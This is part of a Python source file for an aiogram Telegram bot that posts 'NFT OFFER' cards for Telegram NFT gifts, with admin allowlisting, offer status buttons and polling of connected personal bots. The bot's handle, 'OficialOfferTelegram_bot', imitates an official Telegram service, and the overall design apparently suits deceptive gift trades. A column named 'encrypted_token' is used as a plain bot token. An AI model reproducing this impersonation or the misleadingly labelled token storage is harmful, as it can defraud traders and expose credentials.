    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    parts = (message.text or "").split(maxsplit=1)
    if len(parts) != 2:
        await message.answer(
            "Формат: /allow TELEGRAM_ID или /allow @username\n"
            "Для поиска по username пользователь должен сначала открыть бота командой /start."
        )
        return

    user_id, error = resolve_user_id(parts[1])
    if error:
        await message.answer(error)
        return

    db.execute("INSERT OR IGNORE INTO allowed_users(user_id) VALUES(?)", (user_id,))
    db.commit()
    known = db.execute(
        "SELECT username, full_name FROM known_users WHERE user_id = ?", (user_id,)
    ).fetchone()
    display = f"@{known['username']}" if known and known["username"] else (
        known["full_name"] if known else str(user_id)
    )
    await message.answer(f"Доступ выдан: {display} (ID: {user_id}).")


@dp.message(Command("deny", "revoke"))
async def deny_user(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    parts = (message.text or "").split(maxsplit=1)
    if len(parts) != 2:
        await message.answer("Формат: /deny TELEGRAM_ID или /deny @username")
        return

    user_id, error = resolve_user_id(parts[1])
    if error:
        await message.answer(error)
        return

    cursor = db.execute("DELETE FROM allowed_users WHERE user_id = ?", (user_id,))
    db.commit()
    known = db.execute(
        "SELECT username, full_name FROM known_users WHERE user_id = ?", (user_id,)
    ).fetchone()
    display = f"@{known['username']}" if known and known["username"] else (
        known["full_name"] if known else str(user_id)
    )
    if cursor.rowcount:
        await message.answer(f"Доступ забран: {display} (ID: {user_id}).")
    else:
        await message.answer(f"У пользователя {display} (ID: {user_id}) не было доступа.")




# ============================================================
# СОЗДАНИЕ ОФФЕРА ЧЕРЕЗ INLINE MODE
# Формат: @OficialOfferTelegram_bot https://t.me/nft/Slug-123 20 Stars
# или:    @OficialOfferTelegram_bot https://t.me/nft/Slug-123 20 Gram
# ============================================================

@dp.inline_query()
async def create_inline_offer(inline_query: InlineQuery, bot: Bot):
    user = inline_query.from_user
    remember_user(user)

    if not is_allowed(user.id):
        await inline_query.answer(
            [],
            cache_time=1,
            is_personal=True,
        )
        return

    query = (inline_query.query or "").strip()
    parts = query.split(maxsplit=1)

    if len(parts) != 2:
        help_text = (
            "Введите ссылку на NFT и цену.\n"
            "Пример: @OficialOfferTelegram_bot https://t.me/nft/MousseCake-46483 20 Stars"
        )
        results = [
            InlineQueryResultArticle(
                id="inline-help",
                title="🎁 Создать NFT OFFER",
                description="Формат: ссылка на NFT и цена",
                input_message_content=InputTextMessageContent(
                    message_text=help_text
                ),
            )
        ]
        await inline_query.answer(results, cache_time=1, is_personal=True)
        return

    parsed_link = parse_nft_link(parts[0])
    price_match = re.fullmatch(
        r"(\d+)\s*(⭐|stars?|gram|grams|g)?",
        parts[1].strip(),
        re.IGNORECASE,
    )
    if not parsed_link or not price_match or int(price_match.group(1)) <= 0:
        results = [
            InlineQueryResultArticle(
                id="inline-invalid",
                title="⚠️ Неверный формат",
                description="Укажите ссылку t.me/nft/... и цену, например 20 Stars",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "Неверный формат NFT OFFER.\n"
                        "Пример: @OficialOfferTelegram_bot "
                        "https://t.me/nft/MousseCake-46483 20 Stars"
                    )
                ),
            )
        ]
        await inline_query.answer(results, cache_time=1, is_personal=True)
        return

    amount = int(price_match.group(1))
    currency = (price_match.group(2) or "stars").lower()
    price = f"{amount} Gram 💎" if currency in {"gram", "grams", "g"} else f"{amount} ⭐"
    nft_url, nft_name = parsed_link
    lang = "en" if (user.language_code or "").lower().startswith("en") else "ru"
    seller_name = f"@{user.username}" if user.username else user.full_name

    recipient_row = db.execute(
        "SELECT value FROM user_settings WHERE user_id = ? AND key = 'gift_recipient'",
        (user.id,),
    ).fetchone()
    recipient_name = recipient_row["value"] if recipient_row else seller_name
    offer_id = uuid.uuid4().hex[:12]

    try:
        db.execute(
            """INSERT INTO offers
               (offer_id, seller_id, seller_name, nft_url, nft_name, price,
                language, recipient_name, source_bot_id)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (offer_id, user.id, seller_name, nft_url, nft_name, price,
             lang, recipient_name, bot.id),
        )
        db.commit()
        row = get_offer(offer_id)

        result = InlineQueryResultArticle(
            id=offer_id,
            title=f"🎁 {nft_name} — {price}",
            description="Нажмите, чтобы отправить карточку NFT OFFER",
            input_message_content=InputTextMessageContent(
                message_text=make_offer_text(row),
                parse_mode="HTML",
                link_preview_options=nft_preview_options(row),
            ),
            reply_markup=make_keyboard(row),
        )
        await inline_query.answer(
            [result],
            cache_time=0,
            is_personal=True,
        )
        logging.info(
            "INLINE_OFFER_READY offer_id=%s seller_id=%s bot_id=%s nft=%s price=%s",
            offer_id, user.id, bot.id, nft_url, price,
        )
    except Exception:
        logging.exception(
            "INLINE_OFFER_FAILED user_id=%s bot_id=%s query=%r",
            user.id, bot.id, query,
        )
        await inline_query.answer([], cache_time=0, is_personal=True)


# ============================================================
# ОБНОВЛЕНИЕ КАРТОЧКИ INLINE OFFER
# ============================================================

async def update_offer_message(callback: CallbackQuery, row, text: str = None):
    inline_message_id = callback.inline_message_id
    if not inline_message_id:
        logging.warning(
            "Offer callback has no inline_message_id: offer_id=%s",
            row["offer_id"],
        )
        return

    if text is None:
        if row["status"] == "open":
            text = make_offer_text(row)
        elif row["status"] == "accepted":
            text = make_accepted_text(row)
        elif row["status"] == "accepted_return":
            text = make_accepted_return_text(row)
        elif row["status"] == "how":
            text = make_how_to_text(row)
        elif row["status"] == "declined":
            text = "❌ Offer declined." if offer_language(row) == "en" else "❌ Предложение отклонено."
        elif row["status"] == "expired":
            text = "⌛ Offer expired." if offer_language(row) == "en" else "⌛ Срок действия предложения истёк."
        elif row["status"] == "transferred":
            text = (
                f"🎁 Gift {safe(row['nft_name'])} marked as transferred.\n\nBuyer can confirm receipt."
                if offer_language(row) == "en" else
                f"🎁 Подарок {safe(row['nft_name'])} отмечен как переданный.\n\nПокупатель может подтвердить получение."
            )
        elif row["status"] == "completed":
            text = "✅ Receipt confirmed." if offer_language(row) == "en" else "✅ Получение подтверждено."
        else:
            text = make_accepted_text(row)

    try:
        source_bot_id = row["source_bot_id"] if "source_bot_id" in row.keys() else None
        if source_bot_id is not None and callback.bot.id != source_bot_id:
            logging.warning("Inline callback bot mismatch for offer_id=%s", row["offer_id"])
            return
        await callback.bot.edit_message_text(
            inline_message_id=inline_message_id,
            text=text,
            parse_mode="HTML",
            link_preview_options=nft_preview_options(row),
            reply_markup=make_keyboard(row),
        )
    except Exception:
        logging.exception("Не удалось обновить Inline-оффер %s", row["offer_id"])


# ============================================================
# ОБРАБОТКА КНОПОК INLINE-КАРТОЧКИ
# ============================================================

@dp.callback_query(
    F.data.startswith((
        "accept:", "decline:", "how:", "back:", "transfer_info:",
        "sent:", "received:"
    ))
)
async def handle_offer_button(callback: CallbackQuery):
    action, offer_id = callback.data.split(":", 1)
    row = get_offer(offer_id)

    if row is None:
        await callback.answer("Предложение не найдено.", show_alert=True)
        return

    row = expire_offer_if_needed(row)
    if row["status"] == "expired":
        await update_offer_message(callback, row)
        await callback.answer("Срок действия предложения истёк.", show_alert=True)
        return

    user_id = callback.from_user.id

    if action == "accept":
        if row["status"] != "open":
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return
        if user_id == row["seller_id"]:
            await callback.answer("Нельзя принять собственное предложение.", show_alert=True)
            return

        buyer_name = (
            f"@{callback.from_user.username}"
            if callback.from_user.username
            else callback.from_user.full_name
        )
        cursor = db.execute(
            """
            UPDATE offers
            SET status = 'accepted', buyer_id = ?, buyer_name = ?
            WHERE offer_id = ? AND status = 'open'
            """,
            (user_id, buyer_name, offer_id),
        )
        db.commit()
        if cursor.rowcount != 1:
            await callback.answer("Предложение уже принял другой пользователь.", show_alert=True)
            return
        updated = get_offer(offer_id)
        await update_offer_message(callback, updated)
        await callback.answer("Предложение принято.")
        return

    if action == "decline":
        if row["status"] != "open":
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return
        if user_id == row["seller_id"]:
            await callback.answer("Нельзя отклонить собственное предложение.", show_alert=True)
            return

        db.execute(
            "UPDATE offers SET status = 'declined' "
            "WHERE offer_id = ? AND status = 'open'",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_offer_message(callback, updated)
        await callback.answer("Предложение отклонено.")
        return

    if action == "how":
        if user_id != row["buyer_id"]:
            await callback.answer(
                "Инструкцию может открыть покупатель, принявший предложение.",
                show_alert=True,
            )
            return
        if row["status"] not in {"accepted", "accepted_return"}:
            await callback.answer("Сначала предложение должно быть принято.", show_alert=True)
            return
        db.execute(
            "UPDATE offers SET status = 'how' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_offer_message(callback, updated)
        await callback.answer()
        return

    if action == "transfer_info":
        await callback.answer(
            "У создателя оффера не указан username. Попросите его установить username в Telegram.",
            show_alert=True,
        )
        return

    if action == "back":
        if user_id != row["buyer_id"]:
            await callback.answer(
                "Вернуться может покупатель, принявший предложение.",
                show_alert=True,
            )
            return
        if row["status"] != "how":
            await callback.answer("Экран инструкции уже закрыт.", show_alert=True)
            return
        db.execute(
            "UPDATE offers SET status = 'accepted_return' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_offer_message(callback, updated)
        await callback.answer()
        return

    if action == "sent":
        if user_id != row["seller_id"]:
            await callback.answer(
                "Отметить передачу может только создатель оффера.",
                show_alert=True,
            )
            return
        if row["status"] not in {"accepted", "accepted_return"}:
            await callback.answer("Сначала покупатель должен принять предложение.", show_alert=True)
            return
        db.execute(
            "UPDATE offers SET status = 'transferred' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_offer_message(callback, updated)
        await callback.answer("Отметка сохранена. Покупатель может подтвердить получение.")
        return

    if action == "received":
        if user_id != row["buyer_id"]:
            await callback.answer("Подтвердить получение может только покупатель.", show_alert=True)
            return
        if row["status"] != "transferred":
            await callback.answer("Продавец ещё не отметил передачу.", show_alert=True)
            return

        db.execute(
            "UPDATE offers SET status = 'completed' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_offer_message(callback, updated)
        await callback.answer("Получение подтверждено.")
        return


# ============================================================
# ЗАПУСК
# ============================================================

async def _personal_bot_polling(personal_bot: Bot):
    """Получает обновления личного бота и передаёт их общему Dispatcher."""
    bot_id = None
    try:
        bot_id = (await personal_bot.get_me()).id
        offset = None
        allowed_updates = dp.resolve_used_update_types()
        while True:
            try:
                updates = await personal_bot.get_updates(
                    offset=offset,
                    timeout=30,
                    allowed_updates=allowed_updates,
                )
                for update in updates:
                    offset = update.update_id + 1
                    await dp.feed_update(personal_bot, update)
            except asyncio.CancelledError:
                raise
            except Exception:
                logging.exception("Ошибка polling персонального бота id=%s; повтор через 5 секунд", bot_id)
                await asyncio.sleep(5)
    except asyncio.CancelledError:
        raise
    finally:
        if bot_id is not None:
            PERSONAL_BOT_TASKS.pop(bot_id, None)
            PERSONAL_BOT_INSTANCES.pop(bot_id, None)
        await personal_bot.session.close()


async def launch_personal_bot(personal_bot: Bot, expected_bot_id: int):
    """Запускает персонального бота в текущем процессе без рестарта Railway."""
    info = await personal_bot.get_me()
    if info.id != expected_bot_id:
        raise RuntimeError("Токен персонального бота не совпадает с сохранённым bot_id")
    if MAIN_BOT_ID is not None and info.id == MAIN_BOT_ID:
        raise RuntimeError("Нельзя запускать главный бот как подключённый персональный бот")
    old_task = PERSONAL_BOT_TASKS.get(info.id)
    if old_task and not old_task.done():
        old_task.cancel()
        try:
            await old_task
        except asyncio.CancelledError:
            pass
    await personal_bot.delete_webhook(drop_pending_updates=True)
    PERSONAL_BOT_INSTANCES[info.id] = personal_bot
    PERSONAL_BOT_TASKS[info.id] = asyncio.create_task(
        _personal_bot_polling(personal_bot),
        name=f"personal-bot-{info.id}",
    )
    logging.info("Персональный бот @%s запущен без перезапуска процесса", info.username)


async def main():
    global MAIN_BOT_ID, RUNNING_BOTS
    me = await bot.get_me()
    MAIN_BOT_ID = me.id
    # Старые оферы, созданные главным ботом до миграции, остаются рабочими.
    db.execute("UPDATE offers SET source_bot_id = ? WHERE source_bot_id IS NULL", (MAIN_BOT_ID,))
    db.commit()

    # Защита от повторного polling: главный бот не должен запускаться
    # второй раз как персональный, даже если его токен остался в старой БД.
    stale_main_row = db.execute(
        "UPDATE connected_bots SET is_active = 0 WHERE bot_id = ? AND is_active = 1",
        (MAIN_BOT_ID,),
    )
    if stale_main_row.rowcount:
        db.commit()
        logging.warning(
            "Отключена устаревшая запись главного бота в connected_bots: bot_id=%s",
            MAIN_BOT_ID,
        )

    connected = db.execute(
        "SELECT bot_id, username, encrypted_token FROM connected_bots "
        "WHERE is_active = 1 AND bot_id != ?",
        (MAIN_BOT_ID,),
    ).fetchall()
    for item in connected:
        personal_bot = None
        try:
            personal_bot = Bot(token=item["encrypted_token"])
            await launch_personal_bot(personal_bot, item["bot_id"])
            personal_bot = None  # Сессию обслуживает polling-задача.
        except Exception:
            logging.exception("Не удалось запустить подключённый бот id=%s", item["bot_id"])
            if personal_bot is not None:
                await personal_bot.session.close()

    RUNNING_BOTS = [bot, *PERSONAL_BOT_INSTANCES.values()]
    logging.info(
        "NFT Offer Bot запущен: @%s, bot_id=%s, connected_bots=%s, admin_ids=%s",
        me.username, me.id, len(PERSONAL_BOT_TASKS), sorted(ADMIN_IDS)
    )
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        tasks = list(PERSONAL_BOT_TASKS.values())
        for task in tasks:
            task.cancel()
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await bot.session.close()
        db.close()


if __name__ == "__main__":
    asyncio.run(main())
